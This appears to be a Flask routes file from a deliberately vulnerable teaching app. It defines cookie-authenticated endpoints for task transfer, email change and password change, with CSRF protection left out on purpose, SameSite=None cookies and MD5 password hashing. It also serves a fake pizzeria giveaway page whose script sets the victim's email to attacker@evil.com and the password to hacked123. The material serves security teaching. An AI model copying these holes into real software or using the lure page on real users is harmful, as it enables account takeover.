"""
CTOP University - CSRF Vulnerable Routes
INTENTIONALLY INSECURE: Cookie-based session with no CSRF protection.

These endpoints authenticate via the access_token cookie set during login.
Because cookies have SameSite=None and no CSRF token is checked, a malicious
page on any origin can submit forms that carry the victim's cookies.
"""

from flask import Blueprint, request, jsonify, g, make_response
from models import get_db
from auth import verify_token
from db_mysql import get_mysql_connection
import hashlib

csrf_bp = Blueprint('csrf', __name__)


def get_user_from_cookie():
    """Extract user from access_token cookie.
    The production login sets access_token as a cookie with SameSite=None,
    httponly=False, secure=False — making it available to CSRF attacks.
    """
    token = request.cookies.get('access_token')
    if not token:
        return None, "Not authenticated (no access_token cookie). Log in first at /login."
    payload = verify_token(token)
    if not payload:
        return None, "Invalid or expired access_token cookie."
    return payload, None


@csrf_bp.route('/api/csrf/transfer', methods=['POST'])
def transfer_tasks():
    """Transfer tasks between users using cookie-based auth.
    INTENTIONALLY INSECURE: 
    - Uses cookie-based session authentication
    - No CSRF token required
    - State-changing POST endpoint vulnerable to CSRF
    - Accepts form-encoded data (browser forms can submit cross-origin)
    TODO: Implement CSRF tokens, use SameSite=Strict cookies.
    """
    payload, err = get_user_from_cookie()
    if not payload:
        return jsonify({"error": err}), 401

    # Accept both JSON and form data (form data makes CSRF easier)
    data = request.get_json(silent=True) or request.form

    from_user = data.get('from_user_id', str(payload.get('user_id', '')))
    to_user = data.get('to_user_id')

    if not to_user:
        return jsonify({"error": "to_user_id is required"}), 400

    db = get_db()
    db.execute(
        "UPDATE tasks SET assigned_to = ? WHERE assigned_to = ?",
        (to_user, from_user)
    )
    db.commit()
    count = db.execute("SELECT changes()").fetchone()[0]
    db.close()

    return jsonify({
        "message": f"Transferred {count} tasks from user {from_user} to user {to_user}",
        "victim_user": payload.get('username')
    })


@csrf_bp.route('/api/csrf/change-email', methods=['POST'])
def change_email_csrf():
    """Change user email using cookie auth.
    INTENTIONALLY INSECURE: CSRF vulnerable state-changing endpoint.
    - No CSRF token validation
    - Accepts form-encoded POST (browser forms send cookies automatically)
    - SameSite=None on cookies means cross-origin forms work
    TODO: Add CSRF token validation, set SameSite=Strict.
    """
    payload, err = get_user_from_cookie()
    if not payload:
        return jsonify({"error": err}), 401

    # Accept both JSON and form data (form data makes CSRF easier)
    data = request.get_json(silent=True) or request.form
    new_email = data.get('email', '')

    if not new_email:
        return jsonify({"error": "Email is required"}), 400

    user_id = payload.get('user_id')

    # Update in SQLite (tasks DB)
    db = get_db()
    try:
        db.execute("UPDATE users SET email = ? WHERE id = ?", (new_email, user_id))
        db.commit()
    except Exception:
        pass
    finally:
        db.close()

    # Also update in MySQL (main user DB)
    try:
        conn = get_mysql_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET email = %s WHERE id = %s", (new_email, user_id))
        conn.commit()
        cursor.close()
        conn.close()
    except Exception:
        pass

    return jsonify({
        "message": f"Email changed to {new_email}",
        "victim_user": payload.get('username'),
        "user_id": user_id
    })


@csrf_bp.route('/api/csrf/change-password', methods=['POST'])
def change_password_csrf():
    """Change user password using cookie auth.
    INTENTIONALLY INSECURE: No CSRF token, no old password required.
    """
    payload, err = get_user_from_cookie()
    if not payload:
        return jsonify({"error": err}), 401

    data = request.get_json(silent=True) or request.form
    new_password = data.get('password', '')

    if not new_password:
        return jsonify({"error": "password is required"}), 400

    user_id = payload.get('user_id')
    new_hash = hashlib.md5(new_password.encode()).hexdigest()

    try:
        conn = get_mysql_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET password_hash = %s WHERE id = %s", (new_hash, user_id))
        conn.commit()
        cursor.close()
        conn.close()
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    return jsonify({
        "message": f"Password changed for {payload.get('username')}",
        "victim_user": payload.get('username')
    })


@csrf_bp.route('/api/csrf/demo-page', methods=['GET'])
def csrf_demo_page():
    """Serve a page that demonstrates CSRF attack.
    This simulates a malicious website that tricks a logged-in user
    into performing actions without their knowledge.
    
    HOW TO TEST:
    1. Log in to the app at http://localhost:3000/login
    2. Open http://localhost:5000/api/csrf/demo-page in a new tab
    3. Click the button (or let auto-submit run)
    4. Go back to the app and check your email — it changed!
    """
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Mario's Pizzeria - Free Pizza Friday!</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Georgia, 'Times New Roman', serif;
                background: #faf6f1;
                color: #3b2f20;
            }

            /* Top banner bar */
            .topbar {
                background: #b71c1c;
                color: #fff;
                text-align: center;
                padding: 6px 0;
                font-size: 13px;
                letter-spacing: 0.5px;
            }
            .topbar a { color: #fdd835; text-decoration: underline; }

            /* Nav */
            .nav {
                background: #fff;
                border-bottom: 2px solid #e0d6cc;
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 0 30px;
                height: 56px;
            }
            .nav-brand {
                font-family: 'Trebuchet MS', sans-serif;
                font-size: 22px;
                font-weight: bold;
                color: #b71c1c;
            }
            .nav-brand small {
                font-weight: normal;
                font-size: 11px;
                color: #888;
                display: block;
                margin-top: -2px;
            }
            .nav-links { display: flex; gap: 20px; font-size: 14px; }
            .nav-links a { color: #555; text-decoration: none; }
            .nav-links a:hover { color: #b71c1c; }

            /* Hero */
            .hero {
                background: #b71c1c;
                color: #fff;
                padding: 50px 20px 40px;
                text-align: center;
            }
            .hero h1 {
                font-size: 36px;
                margin-bottom: 8px;
                font-weight: normal;
                letter-spacing: 1px;
            }
            .hero h1 strong { font-weight: bold; }
            .hero p {
                font-size: 16px;
                opacity: 0.9;
                max-width: 500px;
                margin: 0 auto 24px;
                line-height: 1.5;
            }
            .hero .subtitle {
                font-size: 13px;
                opacity: 0.7;
                margin-top: 4px;
            }

            /* Main content */
            .main {
                max-width: 620px;
                margin: -20px auto 40px;
                padding: 0 20px;
            }
            .card {
                background: #fff;
                border: 1px solid #e0d6cc;
                border-radius: 3px;
                padding: 30px;
                margin-bottom: 20px;
            }
            .card h2 {
                font-size: 20px;
                color: #b71c1c;
                margin-bottom: 12px;
                border-bottom: 1px solid #eee;
                padding-bottom: 10px;
            }
            .card p {
                font-size: 14px;
                line-height: 1.6;
                color: #555;
                margin-bottom: 12px;
            }

            /* Claim button */
            .claim-btn {
                display: block;
                width: 100%;
                padding: 14px;
                background: #c62828;
                color: #fff;
                border: none;
                border-radius: 2px;
                font-size: 16px;
                font-family: 'Trebuchet MS', sans-serif;
                cursor: pointer;
                letter-spacing: 0.5px;
            }
            .claim-btn:hover { background: #a31515; }
            .claim-btn:active { background: #8b1010; }

            /* Terms */
            .terms {
                font-size: 11px;
                color: #999;
                text-align: center;
                margin-top: 10px;
                line-height: 1.5;
            }

            /* Status boxes */
            .msg { padding: 10px 14px; border-radius: 2px; margin-bottom: 16px; font-size: 13px; display: none; }
            .msg-warn { background: #fff8e1; color: #8d6e00; border-left: 3px solid #f9a825; }
            .msg-ok { background: #edf7ed; color: #2e6b2e; border-left: 3px solid #4caf50; }
            .msg-err { background: #fdecea; color: #8b1a1a; border-left: 3px solid #c62828; }
            .msg a { color: inherit; }

            /* Results log */
            .results-log {
                background: #2d2d2d;
                color: #ccc;
                font-family: Consolas, 'Courier New', monospace;
                font-size: 12px;
                padding: 14px;
                border-radius: 2px;
                margin-top: 12px;
                display: none;
                white-space: pre-wrap;
                word-break: break-all;
                line-height: 1.5;
            }
            .results-log strong { color: #e0e0e0; }

            /* Info box */
            .info-box {
                background: #f5f0eb;
                border: 1px solid #e0d6cc;
                border-radius: 3px;
                padding: 20px;
                font-size: 13px;
                line-height: 1.7;
                color: #5a4b3b;
            }
            .info-box h3 {
                font-size: 14px;
                color: #3b2f20;
                margin-bottom: 10px;
            }
            .info-box code {
                background: #e8e0d6;
                padding: 1px 5px;
                border-radius: 2px;
                font-size: 12px;
            }

            /* Footer */
            .site-footer {
                text-align: center;
                padding: 20px;
                font-size: 12px;
                color: #aaa;
                border-top: 1px solid #e0d6cc;
            }
        </style>
    </head>
    <body>
        <div class="topbar">
            FREE PIZZA FRIDAY &mdash; Limited time offer! &nbsp;
            <a href="#claim">Claim yours now</a>
        </div>

        <div class="nav">
            <div class="nav-brand">
                Mario's Pizzeria
                <small>Est. 2019 &mdash; Handmade with love</small>
            </div>
            <div class="nav-links">
                <a href="#">Menu</a>
                <a href="#">Locations</a>
                <a href="#">Catering</a>
                <a href="#">Contact</a>
            </div>
        </div>

        <div class="hero">
            <h1>It's <strong>Free Pizza Friday!</strong></h1>
            <p>Every Friday, one lucky visitor gets a free large pizza delivered to their door. No strings attached.</p>
            <div class="subtitle">*Valid for registered users only. One per household.</div>
        </div>

        <div class="main">
            <div class="card" id="claim">
                <h2>Claim Your Free Pizza</h2>
                <p>We picked YOUR account for this week's giveaway. All you need to do is tap the button below and we'll process your order right away.</p>

                <div id="cookie-warning" class="msg msg-warn">
                    <strong>Hold on:</strong> We couldn't find your session cookie.<br>
                    Please <a href="http://localhost:3000/login" target="_blank">log in here</a> first, then come back and refresh this page.
                </div>

                <div id="cookie-ok" class="msg msg-ok">
                    Session found &mdash; you're all set. Hit the button to claim your pizza.
                </div>

                <button class="claim-btn" onclick="executeAttack()">Claim My Free Pizza</button>

                <div class="terms">
                    By clicking you agree to our Terms of Service and Privacy Policy.<br>
                    Offer valid while supplies last. Cannot be combined with other promotions.
                </div>

                <div id="status" class="msg"></div>
                <div id="result" class="results-log"></div>
            </div>

            <div class="info-box">
                <h3>What actually happens when you click (for students):</h3>
                This page sends hidden <code>fetch()</code> requests to the CTOP backend
                using <strong>your access_token cookie</strong>. Because the cookie has
                <code>SameSite=None</code> and no CSRF token is checked, the server processes
                the requests as if you made them yourself.<br><br>

                <strong>Attack 1:</strong> Changes your email to <code>attacker@evil.com</code><br>
                <strong>Attack 2:</strong> Changes your password to <code>hacked123</code><br><br>

                <strong>How to test:</strong><br>
                1. Log in at <code>http://localhost:3000/login</code> (user: <code>admin</code> / <code>admin2024</code>)<br>
                2. Open this page in a new tab: <code>http://localhost:5000/api/csrf/demo-page</code><br>
                3. Click the claim button<br>
                4. Go back to the app and check your profile &mdash; your email changed!<br><br>

                <strong>Why it works:</strong> The <code>access_token</code> cookie is set with
                <code>httponly=false</code> and no CSRF token is required. Any page that can read
                the cookie (or any same-origin page) can make authenticated requests on your behalf.
            </div>
        </div>

        <div class="site-footer">
            &copy; 2024 Mario's Pizzeria. All rights reserved. | 123 Fake Street, Springfield
        </div>

        <script>
            function getCookie(name) {
                var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
                return match ? match[2] : null;
            }

            window.onload = function() {
                var token = getCookie('access_token');
                if (token) {
                    document.getElementById('cookie-ok').style.display = 'block';
                } else {
                    document.getElementById('cookie-warning').style.display = 'block';
                }
            };

            async function executeAttack() {
                var status = document.getElementById('status');
                var result = document.getElementById('result');
                var token = getCookie('access_token');

                if (!token) {
                    status.style.display = 'block';
                    status.className = 'msg msg-err';
                    status.innerHTML = 'No session cookie found. <a href="http://localhost:3000/login">Log in first</a>.';
                    return;
                }

                status.style.display = 'block';
                status.className = 'msg msg-ok';
                status.innerHTML = 'Placing your order...';

                var results = [];

                // CSRF Attack 1: Change email
                try {
                    var r1 = await fetch('/api/csrf/change-email', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        credentials: 'include',
                        body: JSON.stringify({ email: 'attacker@evil.com' })
                    });
                    var d1 = await r1.json();
                    results.push('Attack 1 (change email): ' + r1.status + ' - ' + JSON.stringify(d1));
                } catch(e) {
                    results.push('Attack 1 (change email): ERROR - ' + e.message);
                }

                // CSRF Attack 2: Change password
                try {
                    var r2 = await fetch('/api/csrf/change-password', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        credentials: 'include',
                        body: JSON.stringify({ password: 'hacked123' })
                    });
                    var d2 = await r2.json();
                    results.push('Attack 2 (change password): ' + r2.status + ' - ' + JSON.stringify(d2));
                } catch(e) {
                    results.push('Attack 2 (change password): ERROR - ' + e.message);
                }

                status.innerHTML = 'Your order has been placed! Check your email for the delivery confirmation.';

                result.style.display = 'block';
                result.innerHTML = '<strong>CSRF Attack Results:</strong>\\n' + results.join('\\n');
            }
        </script>
    </body>
    </html>
    """
    response = make_response(html)
    response.headers['Content-Type'] = 'text/html'
    return response
